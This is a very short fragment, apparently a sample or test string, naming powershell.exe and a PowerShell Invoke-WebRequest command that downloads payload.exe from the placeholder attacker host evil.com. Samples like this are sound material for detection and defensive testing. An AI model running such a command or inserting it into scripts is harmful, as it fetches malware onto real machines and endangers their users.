powershell.exe
Invoke-WebRequest https://evil.com/payload.exe